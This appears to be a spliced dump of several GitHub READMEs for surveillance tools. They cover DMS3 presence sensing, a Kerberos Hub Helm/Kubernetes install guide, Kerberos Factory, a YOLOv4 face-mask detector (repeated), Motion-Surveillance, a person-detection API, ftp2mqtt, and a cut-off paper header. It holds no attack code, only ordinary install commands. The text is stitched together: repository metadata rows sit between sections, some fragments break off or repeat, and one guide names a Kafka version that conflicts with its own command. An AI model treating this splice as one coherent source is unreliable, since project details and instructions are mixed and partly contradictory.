At its core, **DMS<sup>3</sup>** sensing relies on the concept of a *user proxy*. In this context, *a user proxy is any device representing a user that can be sensed on a home network*. A smartphone is an excellent user proxy, assuming that a user's smartphone is active on the home network when the user is ""at home,"" and drops from the network when the user leaves and is then ""not at home."" **DMS<sup>3</sup>** performs this sensing by searching the end user's network for MAC addresses registered during the configuration of the **DMS<sup>3</sup>Server** component (in the `dms3server.toml` file).

Historically, MAC addresses have always represented, 1-for-1, the underlying hardware. However, more recently, and as a broader privacy policy, some device vendors now provide users the option to have their device generate MAC addresses randomly for over-the-air communications. This feature can disrupt the sensing services used by the **DMS<sup>3</sup>Server** component.

As a result, it's important to review your smartphone (or other user proxies) privacy policies and feature options and configure it accordingly.

## License

To use Kerberos Hub a license is required. This license will grant access the Kerberos Hub API, and allow to connect a number of cameras and Kerberos Vaults. Request a license at `support@kerberos.io`.

## Installation

The Kerberos Hub service has several dependencies, as described below. Different components needs to be installed and are leveraged by Kerberos Hub to store data (MongoDB), bi-directional communication (MQTT/Vernemq), etc. Each of these services are installed through the concept of Helm charts. Once all dependencies are installed you will see that Kerberos Hub itself is [also installed through the Kerberos Hub helm chart](https://github.com/kerberos-io/helm-charts/tree/main/charts/hub).

## What's in the repo?

This repo describes how to install Kerberos Hub inside your own Kubernetes cluster (or [K3S cluster](https://k3s.io/)) using a Helm chart.

A couple of dependencies need to be installed first:

- A message broker ([RabbitMQ](https://www.rabbitmq.com/), [Kafka](https://kafka.apache.org/) or others)
- an event broker ([Vernemq](https://vernemq.com/))
- a database ([MongoDB](https://www.mongodb.com/)),
- and a TURN server ([Pion](https://github.com/pion/turn))

Next to that one can use an Nginx ingress controller or Traefik for orchestrating the ingresses, however this is all up to you. Once all dependencies are installed, the appropriate values [should be updated in the Kerberos Hub `values.yaml`](https://github.com/kerberos-io/helm-charts/blob/main/charts/hub/values.yaml) file.

We do manage certificates through cert-manager and letsencrypt, and rely on HTTP01 and DNS01 resolvers. So you might need to change that for your custom scenarion (e.g. on premise deployment).

We rely on cert-manager and letsencrypt for generating all the certificates we'll need for the Kerberos Hub web interface, Kerberos Hub api and the Vernemq broker (WSS/TLS).

As a best practice we will install all the dependencies in their own namespace. Let's start by creating a separate namespace for cert-manager.

    kubectl create namespace cert-manager

Install the cert-manager helm chart into that namespace.

    helm install cert-manager jetstack/cert-manager --namespace cert-manager --set installCRDs=true

If you already have the CRDs install you could get rid of `--set installCRDs=true`.

Next we will install a cluster issuer that will make the HTTP01 challenges, this is needed for resolving the certificates of both Kerberos Hub web interface and api.

    kubectl apply -f cert-manager/cluster-issuer.yaml

## Optional - Rancher

A great way to manage your cluster through a UI is Rancher. This is totally up to you, but we love to use it a Kerberos.io

    helm repo add rancher-latest https://releases.rancher.com/server-charts/latest
    helm repo update
    kubectl create namespace cattle-system
    helm install rancher rancher-latest/rancher \
    --namespace cattle-system \
    --set hostname=rancher.kerberos.xxx \
    --set ingress.tls.source=letsEncrypt \
    --set letsEncrypt.email=xxx@email.com \
    --set 'extraEnv[0].name=CATTLE_TLS_MIN_VERSION' \
    --set 'extraEnv[0].value=1.2'

## Message broker or queue

To integrate, scale and make Kerberos Hub more resilient the Kerberos Hub pipeline is using a message broker (or queue) to provide a resilient message flow. The message broker integrates the different micro services you'll find in Kerberos Hub, and allow you to scale specific services independently. As of now we suppor two main messages brokers: RabbitMQ and Kafka. Depending on your current solution landscape and/or skills you might prefer one over the other.

### RabbitMQ (preferred)

RabbitMQ is the preferred message broker, as it's easy to setup, scale and comes with high availability out of the box. RabbitMQ will distribute messages to the different consumer (microservices).

As a best practice let's create another namespace.

    kubectl create namespace rabbitmq

Before installing [the RabbitMQ helm chart,](https://github.com/bitnami/charts/tree/main/bitnami/rabbitmq) make sure to have a look at the `rabbitmq/values.yaml` file. This includes different variables such as `username`, `password`, `replicaCount` and more. Change those settings for your own preference or usecase.

    helm install rabbitmq bitnami/rabbitmq -n rabbitmq -f rabbitmq/values.yaml

You might need to add a few CRD's. If you see following error, `unable to recognize """": no matches for kind ""ServiceMonitor"" in version ""monitoring.coreos.com/v1`.

    kubectl create -f https://raw.githubusercontent.com/prometheus-operator/prometheus-operator/master/bundle.yaml

### or Kafka

Kafka is used for the Kerberos Pipeline, this is the place where microservices are executed in parallel and/or sequentially. These microservices will receive events from a Kafka topic and then process the recording, and it's metadata. Results are injected back into Kafka and passed on to the following microservices. Microservices are independently horizontal scalable through replicas, this means that you can distribute your workload across your nodes if a specific microservice requires that.

As a best practice let's create another namespace.

    kubectl create namespace kafka

Before installing the Kafka helm chart, go and have a look in the kafka/values.yaml file. You should update the clientUsers and clientPasswords. Have a look at the zookeeper credentials as well and update accordingly. Make sure to install version 18.4.4, as this `values.yaml` is matched for that specific helm release.

    helm install kafka bitnami/kafka -f ./kafka/values.yaml -n kafka  --version 20.0.2

## Event broker

Next to a message broker, we are using an event broker (MQTT) for bidirectional communication in the Kerberos Hub ecosystem.

### Vernemq

This Vernemq broker, which is horizontal scalable, allows communicating with Kerberos agents at the edge (or wherever they live) and Kerberos Vault to forward recordings from the edge into the cloud.

We'll create a namespace for our event broker Vernemq.

    kubectl create namespace vernemq

Create a certificate, so we can handle TLS/WSS. (this needs a DNS challenge)

    kubectl apply -f vernemq/vernemq-secret.yaml --namespace cert-manager
    kubectl apply -f vernemq/vernemq-issuer.yaml --namespace vernemq
    kubectl apply -f vernemq/vernemq-certificate.yaml --namespace vernemq

By default, a username and password is set for the Vernemq broker. You can find these in the `vernemq/values.yaml` file [as shown below](https://github.com/kerberos-io/hub/blob/master/vernemq/values.yaml#L216-L217).

    ...
    - name: DOCKER_VERNEMQ_USER_YOURUSERNAME
    value: ""yourpassword""
    ...

Please note that the username is defined in capitals `YOURUSERNAME`, but will result as `yourusername`. So anything written in capitals, will be lowercase.

Go a head and install the Vernemq chart with the relevant configuration options.

    helm install vernemq vernemq/vernemq -f vernemq/values.yaml  --namespace vernemq

## Database

Within Kerberos Hub data is stored/required for users, recordings, sites, groups and many other entities. As for now the entire Kerberos.io technology stack is relying on MongoDB.

### MongoDB

A MongoDB instance is used for data persistence. Data might come from the Kerberos Pipeline or user interaction on the Kerberos Hub frontend.

We will create a namespace for our Mongodb deployment as well.

    kubectl create namespace mongodb

Create a persistent volume, this is where the data will be stored on disk.

    kubectl apply -f ./mongodb/fast.yaml

Before installing the mongodb helm chart, go and have a look in the `mongodb/values.yaml` file. You should update the root password to a custom secure value.

    helm install mongodb bitnami/mongodb --values ./mongodb/values.yaml -n mongodb

## TURN/STUN

Within Kerberos Hub we allow streaming live from the edge to the cloud without port-forwarding. To make this work we are using a technology called WebRTC that leverages a TURN/STUN server.

![hub-architecture](assets/images/hub-stunturn.png)

To run a TURN/STUN server please [have a look at following repository](https://github.com/kerberos-io/turn-and-stun), this will deploy a Docker container on a specific host that will act as a proxy for network traversal. The TURN/STUN server will make sure a connection from a Kerberos Agent to a Kerberos Hub viewer is established.

## Ingress

Ingresses are needed to expose the Kerberos Hub front-end and api to the internet or intranet. We prefer nginx ingress but if you would prefer Traefik, that is perfectly fine as well.

### Nginx

We'll use following helm chart `ingress-nginx` for setting up nginx in our cluster.

    helm upgrade --install ingress-nginx ingress-nginx \
    --repo https://kubernetes.github.io/ingress-nginx \
    --namespace ingress-nginx --create-namespace

On AKS add following attribute, otherwise nginx will not be accessible through `LoadBalancer`. You will receive an not reachable error.

    --set controller.service.externalTrafficPolicy=Local

### or (option) Install traefik

     helm install traefik traefik/traefik -f ./traefik/values-ssl.yaml

# Kerberos Hub

So once you hit this step, you should have installed a previous defined dependencies. Hopefully you didn't have too much pain with the certificates. Go to [the Kerberos Hub helm chart repo](https://github.com/kerberos-io/helm-charts/blob/main/charts/hub) when installing for the first time, there you'll find all the relevant information for configuring and creating.

If you already know what to do, grab the latest `values.yaml` at the [Kerberos Hub Helm chart repo](https://github.com/kerberos-io/helm-charts/blob/main/charts/hub/values.yaml), and reference it from your `helm install` or `helm upgrade` command.

Install the Kerberos Hub chart in a specific namespace and take into the values.yaml file.

    helm install hub kerberos/hub --values values.yaml -n kerberos-hub --create-namespace

Upgrade the Kerberos Hub chart

    helm upgrade hub kerberos/hub --values values.yaml -n kerberos-hub

Uninstall the Kerberos Hub chart

    helm uninstall hub -n kerberos-hub

## Kerberos Hub Object Detector

[The Hub Object Detector](https://github.com/kerberos-io/hub-objecttracker) shows how to levarage machine learning into Kerberos Hub. By deploying this workload in a GPU enabled Kubernetes cluster (or standalone container) you can predict and track objects in your video feeds captured by your Kerberos Agents and stored in Kerberos Vault.

![Hub Object Detector](./assets/images/hub-objectdetector.png)

[The object detector for Kerberos Hub](https://github.com/kerberos-io/hub-objecttracker) is showing how you connect to a message broker (RabbitMQ, Kafka or others) and how you can consume and download recordings from Kerberos Vault. In the [Kerberos Vault example directory](https://github.com/kerberos-io/vault/tree/master/examples) we are showing a concrete example of how to do this.

Kerberos Factory brings [the Kerberos Agent](https://github.com/kerberos-io/agent) to another level. [Kerberos Agent's](https://github.com/kerberos-io/agent) are deployed where and how you want, it can run as a binary, Docker container or inside a Kubernetes cluster. The latter is where Kerberos Factory comes into the picture. Kerberos Factory is a UI, build for non-technical users, that allows to deploy and configure [Kerberos Agents](https://github.com/kerberos-io/agent) into your Kubernetes cluster more easily. It bypasses the complexity of creating Kubernetes resources, by providing a simple UI to connect a Kerberos Agent to your camera, and configure it for your usecase.

Kerberos Factory is build for the management of [Kerberos Agents](https://github.com/kerberos-io/agent) in a Kubernetes cluster. If Kubernetes is out-of-scope for your deployment, and you plan to use a manual or single-node container deployment (e.g. Docker), it's recommended to use the default `docker compose` or `docker` CLI.

## :thinking: Prerequisites

* a Kubernetes cluster configured with one or more nodes.

## :books: Overview

## Installation

As previously mentioned, running a Kerberos Factory, requires a Kubernetes cluster. If you plan to use solely `docker` or `docker compose` then Kerberos Factory is out-of-scope.

### Kubernetes

Leveraging Kerberos Factory allows you to deploy Kerberos Agents in you cluster. Kubernetes will automatically load balance your Kerberos Agents across your nodes, without you requiring all the hassle of scaling out your video landscape.

> Follow the `Kubernetes` tutorial [by navigating to the kubernetes sub folder in this repostitory](kubernetes/).

## Introductions

Please note that we have added a brief introduction to Kerberos Factory below. To get a complete overview [visit the documentation page](https://doc.kerberos.io), where you will be able to learn about all the ins and outs of the Kerberos.io ecosystem.

### Kerberos Factory

Kerberos Factory is a user interface which consumes and interacts with the Kubernetes API. It schedules [Kerberos Agents](https://github.com/kerberos-io/agent) as Kubernetes resource, and more specificly Kubernetes deployments. For every camera stream a Kerberos Agent is created as a Kubernetes deployment.

![Kerberos Factory ui](assets/factory-login.gif)

Through a web interface a non-technical administrator can configure and add more [Kerberos Agents](https://github.com/kerberos-io/agent) to its cluster. The administrator has the ability to interact with the Kerberos Agent through one or more configuration screens, to tune and optimize the Kerberos Agent for his/her specific usecase.

#### ONVIF

Kerberos Factory allows you to scan the local network and create Kerberos Agents for every discovered camera. Once discovered, Kerberos Factory will create a Kubernetes deployment for every Kerberos Agent.

#### Global settings

Instead of tuning all your Kerberos Agent, Kerberos Factory allows you to set up global settings which are inherited by all your Kerberos Agents. This feature helps scaling out and controlling your video landscape more easily.

[![Kerberos Factory](./assets/kerberos-factory.png)](https://kerberos.io/)

### Mission

Kerberos Factory belong to the Enterprise suite. The goal of this suite is to support enterprises building a scalable video surveillance infrastructure that is open to support all business processes and usecases. Kerberos Enterprise Suite will do all the heavy lifting in terms scaling the processing and storage of you surveillance cameras. On top of that it will provide integration and extensibility to build your own applications on top of that using Swagger API's, and real-time messaging such as Kafka.

Because of the COVID-19 pandemic of 2020, more and more people are concerned with protecting themselves using masks, thus the need of software capable of monitoring whether the people are wearing masks or not. That is why I created a PyQt5 application using OpenCV (with CUDA support) based on the YOLOv4 algorithm, capable of monitoring the safety level of a space with video surveillance through multiple video cameras, connected either via USB or network to the system.


### Installing dependencies:
#### For Windows:
1. Check if the GPU of the system supports CUDA by checking if it is in this list: https://developer.nvidia.com/cuda-gpus
2. If the GPU supports CUDA, install it using this guide: https://towardsdatascience.com/installing-tensorflow-with-cuda-cudnn-and-gpu-support-on-windows-10-60693e46e781
3. Install the latest Python 3 version from https://www.python.org/downloads/
4. Run this command in command line:
    ```powershell
    PS C:> pip install numpy PyQt5 PyQt5-stubs pyqt5-tools
    ```
5. Install OpenCV with CUDA support using this tutorial: https://medium.com/analytics-vidhya/build-opencv-from-source-with-cuda-for-gpu-access-on-windows-5cd0ce2b9b37

#### For Ubuntu/Debian:
1. Check if the GPU of the system supports CUDA by checking if it is in this list: https://developer.nvidia.com/cuda-gpus
2. If the GPU supports CUDA, install it using this guide: https://medium.com/@pydoni/how-to-install-cuda-11-4-cudnn-8-2-opencv-4-5-on-ubuntu-20-04-65c4aa415a7b
3. Run these commands:
```console
foo@bar:~$ sudo chmod +x install_dependencies_ubuntu.sh    # make the script executable
foo@bar:~$ sudo ./install_dependencies_ubuntu.sh           # run the script to install the dependencies of the application
```


### Guide for using the Face Mask Detector application:

1. Execute the Python Script from command line like this:
```console
foo@bar:~$ python .\face_mask_detection.py
```
or
```console
foo@bar:~$ python3 .\face_mask_detection.py
```

2. From the start menu, you can add or delete a camera from the camera list. When creating a camera, a name and an ID must be provided. The ID must be from one of these categories:
    - **integer (e.g.: 0, 1, 2...):** A camera with this ID represents a video recording device physically connected to the system which uses the application. For instance, if you want to use the webcam of a laptop, you must create a camera with an ID of 0 (an explanation would be that, in particular for Ubuntu, the integrated camera of a laptop is interpreted as /dev/video0).
    - **IP address (e.g.: https://192.168.43.1:8080/video):** A camera with this ID represents a video recording device connected to the same network as the system which uses the application. For example, one can connect an Android device as a remote camera using ""IP Webcam"" Google Playstore app: https://play.google.com/store/apps/details?id=com.pas.webcam&hl=ro&gl=US.
    - **Video file location:** A camera with this ID represents a locally stored video, on which our application will run the detection. This case is useful whenever we have an already pre-recorded video file, possibly from a camera that was not connected to a system with this application.
    
3. When you think that the camera list is ready, you can access the main menu.

4. In the main menu, you will have the following elements: 
    - **A main panel** where the selected camera will be displayed together with the detections of the masked or unmasked faces from it, as well as real time statistics of their numbers and its status (""Not Connected"" - the camera is not connected to the system, ""Safe"" - all people wear mask, ""Warning"" - 1 or 2 people do not wear a mask, ""Danger"" - more than 3 people do not wear a mask);
    - **A small selection menu** in the upper part of the window from where you can select which camera do you wish to visualize;
    - **A camera control panel** in the right part of the window where the camera list is displayed together with the status of every camera in real time;
    - **A ""Take Photo"" button** placed in the lower part of the window used for taking photos for further analysis in order to identify the persons not wearing a mask.
    
5. Despite the fact that you can take photos manually from the main menu, the application makes each of the connected cameras capable of taking photos automatically whenever its state switches to ""Warning"" or ""Danger"".

### Approaches

**1. Using Optical Flow:** Extracting spatial-temporal features using optical flow and training classifiers for detecting anomaly

**2. Using AlexNet:** Alexnet contains eight learned layers, five convolutional and three fully-connected layers. Pretrained Alexnet is applied to each frame of the video. Then we take the output of the fc7 layer which gives us a 4096 dimensional vector. 

**3. Time Series Analysis:** Standard statistical techniques for anomaly detection in the feature space we obtain from AlexNet.

**4. Topic Modelling:** A generative model of typical behavior is learned using good discriminative features, and then abnormal behaviors (outliers) are detected and classified as those that are badly explained by the learned model.

Surveillance is a lightweight video surveillance system using ffmpeg and [Motion](https://motion-project.github.io/ ""Motion"")   intended for use on Raspberry Pi with network attached dual-stream cameras, but usable on any linux system with any video source for which ffmpeg & motion support.


Purpose:

1. I was not able to find an existing software package that met my needs of providing full high-def video stream recordings and motion detection to flag video segments that could run with limited CPU available on a raspberry pi.

2. I wanted to increase my Python knowledge, which has previously been limited to very small projects, the largest of which was a database translation and mostly were very small, no more than a single function. This project seemed large enough to be interesting and require learning some of the language capabilities I hadn't previously been exposed to.

With #2 in mind, along with my previous software knowledge existing primarily of c++, java, ada and c, I welcome feedback from more experienced python developers on more pythonic -- I'd like to learn more.

1. Orientation
2. Individual action
3. Group detection
4. Group activity
5. Scene activity

That is why I created a Python application using OpenCV (with CUDA support) based on the YOLOv4 algorithm, more precisely the tiny option, capable of monitoring the safety level of a space with video surveillance. This is the Jetson Nano version of the application.","# Face Mask Detector for Jetson Nano
Because of the COVID-19 pandemic of 2020, more and more people are concerned with protecting themselves using masks, thus the need of software capable of monitoring whether the people are wearing masks or not. That is why I created a PyQt5 application using OpenCV (with CUDA support) based on the YOLOv4 algorithm, more precisely the tiny option, capable of monitoring the safety level of a space with video surveillance through multiple video cameras, connected either via USB or IP to the system. This is the Jetson Nano version of the application.

### Guide for using the Face Mask Detector application:

1. Run these commands:
```console
foo@bar:~$ sudo chmod +x install_dependencies_jetson_nano.sh    # make the script executable
foo@bar:~$ sudo ./install_dependencies_jetson_nano.sh           # run the script to install the dependencies of the application
```

2. Execute the Python Script from command line like this:
```console
foo@bar:~$ python ./face_mask_detection.py
```
or
```console
foo@bar:~$ python3 ./face_mask_detection.py
```

3. From the start menu, you can add or delete a camera from the camera list. When creating a camera, a name and an ID must be provided. The ID must be from one of these categories:
    - **integer (e.g.: 0, 1, 2...):** A camera with this ID represents a video recording device physically connected to the system which uses the application. For instance, if you want to use the webcam of a laptop, you must create a camera with an ID of 0 (an explanation would be that, in particular for Ubuntu, the integrated camera of a laptop is interpreted as /dev/video0).
    - **IP address (e.g.: https://192.168.43.1:8080/video):** A camera with this ID represents a video recording device connected to the same network as the system which uses the application. For example, one can connect an Android device as a remote camera using ""IP Webcam"" Google Playstore app: https://play.google.com/store/apps/details?id=com.pas.webcam&hl=ro&gl=US.
    - **Video file location:** A camera with this ID represents a locally stored video, on which our application will run the detection. This case is useful whenever we have an already pre-recorded video file, possibly from a camera that was not connected to a system with this application.
    
4. When you think that the camera list is ready, you can access the main menu.

5. In the main menu, you will have the following elements: 
    - **A main panel** where the selected camera will be displayed together with the detections of the masked or unmasked faces from it, as well as real time statistics of their numbers and its status (""Not Connected"" - the camera is not connected to the system, ""Safe"" - all people wear mask, ""Warning"" - 1 or 2 people do not wear a mask, ""Danger"" - more than 3 people do not wear a mask);
    - **A small selection menu** in the upper part of the window from where you can select which camera do you wish to visualize;
    - **A camera control panel** in the right part of the window where the camera list is displayed together with the status of every camera in real time;
    - **A ""Take Photo"" button** placed in the lower part of the window used for taking photos for further analysis in order to identify the persons not wearing a mask.
    
6. Despite the fact that you can take photos manually from the main menu, the application makes each of the connected cameras capable of taking photos automatically whenever its state switches to ""Warning"" or ""Danger"".

richbl,motion-surveillance,,https://github.com/richbl/motion-surveillance,https://api.github.com/repos/motion-surveillance/richbl,Ruby-based video security surveillance system using Motion (a software motion detector),"## Motion-Surveillance

> **DEPRECATED PROJECT**: note that this project has been replaced by a backward-compatible project located at [**DMS<sup>3</sup>**](https://github.com/richbl/go-distributed-motion-s3 ""Distributed Motion Surveillance Security System""), which is a refactor of this project rewritten in Go, and features greater features, stability, and functionality.


**Motion-Surveillance** is a Ruby-based video surveillance system using the [Motion](http://www.lavrsen.dk/foswiki/bin/view/Motion/WebHome ""Motion"") motion detection software package. Motion-Surveillance includes the following package components:

   - Motion-Monitor: integrated system services that monitor the status of devices on a given network, and start/stop the [Motion](http://www.lavrsen.dk/foswiki/bin/view/Motion/WebHome ""Motion"") package as appropriate.
   - Motion-Mail: a configurable component for generating and sending an email with images whenever [Motion](http://www.lavrsen.dk/foswiki/bin/view/Motion/WebHome ""Motion"") generates a motion-related event.

## Features

 - [Motion](http://www.lavrsen.dk/foswiki/bin/view/Motion/WebHome ""Motion"") Software Package
 
	- Movement detection support of video cameras. See [this list](http://www.lavrsen.dk/foswiki/bin/view/Motion/WorkingDevices ""Device Compatibility"") for video device compatibility.

## How Motion-Surveillance Works

Each of the Motion-Surveillance package components perform independent services that are integrated with the [Motion](http://www.lavrsen.dk/foswiki/bin/view/Motion/WebHome ""Motion"") software package.

### Motion-Monitor Operation
Motion-Monitor is responsible for starting/stopping the [Motion](http://www.lavrsen.dk/foswiki/bin/view/Motion/WebHome ""Motion"") software package. 

It does this by periodically scanning a network for the existence of a monitored device(s). This device can be anything that exposes its MAC address on the network (*e.g.*, a mobile phone on a home LAN). In the default case, if that device is found on the network, it's assumed that ""someone is home"" and so, [Motion](http://www.lavrsen.dk/foswiki/bin/view/Motion/WebHome ""Motion"") is not started (or stopped if already running). If that device MAC is no longer found on the network, it's assumed that ""nobody is home"" and [Motion](http://www.lavrsen.dk/foswiki/bin/view/Motion/WebHome ""Motion"") is started (if not already running). Similar logic is used in the reverse case: when a monitored device is once again ""back home,"" [Motion](http://www.lavrsen.dk/foswiki/bin/view/Motion/WebHome ""Motion"") is stopped.

Alternatively, the 'Always On' feature, if enabled, uses time-of-day to start/stop the [Motion](http://www.lavrsen.dk/foswiki/bin/view/Motion/WebHome ""Motion"") software package. Motion-Monitor will look at the time range specified, and if the current time falls between the time range, [Motion](http://www.lavrsen.dk/foswiki/bin/view/Motion/WebHome ""Motion"") will be activated. Once the current time falls outside of the specified time range, [Motion](http://www.lavrsen.dk/foswiki/bin/view/Motion/WebHome ""Motion"") is then stopped. The optional 'Always On' feature works in conjunction with IoT device detection.

Operationally, Motion-Monitor is comprised of three component objects (or actors): 

- **System**: a system cron job that periodically wakes up the **MotionMonitorManager** component
- **MotionMonitorManager**: checks to see if **MotionMonitorDaemon** is running, and if it isn't, determines whether it should. The **MotionMonitorManager** component is responsible for starting the [Motion](http://www.lavrsen.dk/foswiki/bin/view/Motion/WebHome ""Motion"") software package
- **MotionMonitorDaemon**: while [Motion](http://www.lavrsen.dk/foswiki/bin/view/Motion/WebHome ""Motion"") is active, periodically checks to see if it should continue to run, and stops it if necessary 

The activity diagram below shows the work flow for each of these components:

![Motion-Surveillance Activity Diagram](https://raw.githubusercontent.com/richbl/motion-surveillance/master/activity_diagram.png ""Motion-Surveillance Activity Diagram"")

> **Note:** additional information about the Motion-Monitor component can be found in the Motion-Surveillance installation file ([`INSTALL.md`](https://github.com/richbl/motion-surveillance/blob/master/INSTALL.md ""INSTALL.md"")).

### Motion-Mail Operation

Motion-Mail is the Motion-Surveillance component responsible for sending an email whenever a valid movement event is triggered in [Motion](http://www.lavrsen.dk/foswiki/bin/view/Motion/WebHome ""Motion"").

These events are triggered through the [`on_picture_save`](http://www.lavrsen.dk/foswiki/bin/view/Motion/ConfigOptionOnPictureSave ""on_picture_save command"") command and the [`on_movie_end`](http://www.lavrsen.dk/foswiki/bin/view/Motion/ConfigOptionOnMovieEnd ""on_movie_end command"") command in [Motion](http://www.lavrsen.dk/foswiki/bin/view/Motion/WebHome ""Motion"") and are how Motion-Mail gets called. 

The syntax for these [Motion](http://www.lavrsen.dk/foswiki/bin/view/Motion/WebHome ""Motion"") commands are:
  
	<on_picture_save|on_movie_end> <absolute path to ruby> <absolute path to motion_mail.rb> <%D %f %t>

These commands are managed through the [Motion](http://www.lavrsen.dk/foswiki/bin/view/Motion/WebHome ""Motion"") configuration file called `motion.conf`.

Once configured, Motion-Mail will respond to these [Motion](http://www.lavrsen.dk/foswiki/bin/view/Motion/WebHome ""Motion"") event [hooks](http://en.wikipedia.org/wiki/Hooking ""Hooking""), and an email will be generated and sent along with an optional image file or video clip.

> **Note:** additional information about the Motion-Mail component can be found in the Motion-Surveillance installation file ([`INSTALL.md`](https://github.com/richbl/motion-surveillance/blob/master/INSTALL.md ""INSTALL.md"")).

## Motion-Surveillance Requirements

1element,video-person-detection,,https://github.com/1element/video-person-detection,https://api.github.com/repos/video-person-detection/1element,REST API server to detect people in video files using TensorFlow Lite.,"# Video Person Detection

REST API server that can detect the presence of humans in a video file. 
Intended for video surveillance to post-process IP camera footage and reduce 
false positives.

Video frames are analyzed using TensorFlow Lite. This deep learning-based 
approach will reduce false motion alerts usually caused by weather conditions 
(e.g. clouds changing the lightning) or insects crawling across the camera lens.

The Google Coral USB Accelerator (TPU) is optionally supported to speed up 
inference time. See performance measurements below.

Sample request:

```
curl -d '{""videoFilePath"":""video-file.mp4"", ""cameraId"":""backyard""}' -H ""Content-Type: application/json"" -X POST http://localhost:8000/detect/person
```

Response:

```
{
  ""personDetected"": true,
  ""personConfidence"": 0.89
}
```


## How to run

The preferred way is to run video-person-detection in a docker container. 
If you don't want to use docker, you can install python and all dependencies
to run the uvicorn server on your own.


### With docker

Clone the repository and run:

```
sudo docker-compose build
```

This will build the docker image.

Afterwards start the container:

```
sudo docker-compose up
```

You should end up with a webserver running on port 8000.

Refer to the configuration section on how to configure the application.


### Without docker

If you don't want to use a docker container you can install all dependencies
on your own.

These instructions have been tested on Ubuntu Server 20.04 LTS.

```
# install python 3.8 and virtual environment support
sudo apt-get install python3 python3-venv

# clone the repository
git clone https://github.com/1element/video-person-detection.git .

# create a new python virtual environment in the cloned repository directory
python3 -m venv .venv 

# activate the virtual environment
source .venv/bin/activate
```

Install the appropriate TensorFlow Lite version for your platform according to
[https://www.tensorflow.org/lite/guide/python](https://www.tensorflow.org/lite/guide/python)

For example:

```
pip3 install https://dl.google.com/coral/python/tflite_runtime-2.1.0.post1-cp38-cp38-linux_x86_64.whl
```

Install the project dependencies (Pillow, fastapi, uvicorn, 
opencv-python-headless):

```
pip3 install -r requirements.txt
```

If you have the Coral USB accelerator you should [install the Edge TPU runtime](https://coral.ai/docs/accelerator/get-started/#1-install-the-edge-tpu-runtime)
as well:

```
echo ""deb https://packages.cloud.google.com/apt coral-edgetpu-stable main"" | sudo tee /etc/apt/sources.list.d/coral-edgetpu.list
curl https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key add -
sudo apt-get update
sudo apt-get install libedgetpu1-std
```

Download the TensorFlow Lite models:

```
curl -o models/ssd_mobilenet_v2_coco_quant_postprocess.tflite https://raw.githubusercontent.com/google-coral/edgetpu/master/test_data/ssd_mobilenet_v2_coco_quant_postprocess.tflite
curl -o models/ssd_mobilenet_v2_coco_quant_postprocess_edgetpu.tflite https://raw.githubusercontent.com/google-coral/edgetpu/master/test_data/ssd_mobilenet_v2_coco_quant_postprocess_edgetpu.tflite
```

You should now be able to start the webserver by executing:

```
uvicorn videopersondetection.main:app --host 0.0.0.0
```


## Configuration

A yaml configuration file `config/config.yml` must exist. Beside different 
thresholds you can configure how many frames should be skipped. So only 
every n-th frame will be processed. This can increase the performance 
significantly, but might also affect accurancy.

A camera specific configuration is possible to set a minimum required area of
the bounding box for the detected person. You can also define a zone contour
to ignore if the center of the bounding box for the detected person is inside
it.

Make sure the property `video_file_base_path` is set to the directory
containing the video files you want to analyze.

Refer to the provided [example configuration](https://github.com/1element/video-person-detection/blob/master/config/config.yml)
for details.


## Usage

Sample request via cURL:

```
curl -d '{""videoFilePath"":""video-file.mp4"", ""cameraId"":""backyard""}' -H ""Content-Type: application/json"" -X POST http://localhost:8000/detect/person
```

The `videoFilePath` property must contain the relative path to the video file 
to analyze (based upon the configured `video_file_base_path` in 
`config/config.yml`). The application must have read access to this location.

The `cameraId` property must match one of the configured cameras in 
`config/config.yml`.


## Performance

A simple benchmark script is included in this repository.

To download the benchmark video file run:

```
curl -o benchmark.mkv http://www.jell.yfish.us/media/jellyfish-3-mbps-hd-h264.mkv
```

Run the benchmark (`benchmark.py`):

```
python3 -m videopersondetection.benchmark
```

Here are some reports for the downloaded jellyfish videofile
(h264, 1920x1080, 30fps, 30 seconds) to give you an idea of the performance.

1element,ftp2mqtt,,https://github.com/1element/ftp2mqtt,https://api.github.com/repos/ftp2mqtt/1element,Bridge images from an IP camera via FTP to an MQTT broker.,"# ftp2mqtt

This microservice acts as a bridge between IP cameras (with FTP support
for motion detected events) and an MQTT broker.

It should run on a private network only, it is not recommend to expose it
to the internet.


## How to build

You need the Java Development Kit (JDK) 10 installed on your system.

1. Clone this repository:

   ```
   git clone https://github.com/1element/ftp2mqtt.git .
   ```

2. Run Gradle build:

   ```
   ./gradlew build
   ```

You will end up with an artifact (`ftp2mqtt-<VERSION>.jar`) in
the `build/libs/` directory.

You can start the application by executing:

```
java -jar ftp2mqtt-<VERSION>.jar
```

If you want to use Docker there is a Gradle task to build a Docker image:

```
./gradlew build docker
```

This can also be done manually by passing the artifact as an argument
to the Docker build command:

```
docker build -t ftp2mqtt --build-arg JAR_FILE=build/libs/ftp2mqtt-<VERSION>.jar .
```


## Configuration

If you start the application Spring Boot expects a configuration file
`application.properties` in the same directory where your JAR file is
located. If you use Docker there is a volume `/config` for this.

Example configuration [application.properties](https://github.com/1element/ftp2mqtt/blob/master/src/main/resources/application.properties):

```
# FTP server
ftp.port=2121
ftp.password=secret

# MQTT
mqtt.broker-connection=ssl://localhost:1883
mqtt.username=username
mqtt.password=password
mqtt.topic-prefix=ipcamera/
```

You can specify the port and the password for the built-in FTP server.
Connections are accepted for any username. The FTP username will be
prefixed with the configured `mqtt.topic-prefix` and used as the
MQTT topic to publish to.

So if your IP camera uploads motion detected images to the FTP server
using the username ""backyard"", the image will be published to the MQTT
brokers topic `ipcamera/backyard` (assuming ""ipcamera/"" is configured as
the prefix).

You also need to configure your MQTT broker connection (host and port)
as well as the username and password.


## Contributions

This application was written for my own purpose, therefore it may lack in
features and configuration abilities. In case it might be useful for
someone I decided to share it. However, pull requests are welcome.

We use CenterNet to locate actions spatially - the first use of key-points in action detection. ,"# Key-point Detection based Online Real-Time Spatio-Temporal Action Localization
> Kalana Abeywardena, Sakuna Jayasundara, Sachira Karunasena, Shechem Sumanthiran, Dr. Peshala Jayasekara, Dr. Ranga Rodrigo

<p align='justify'>
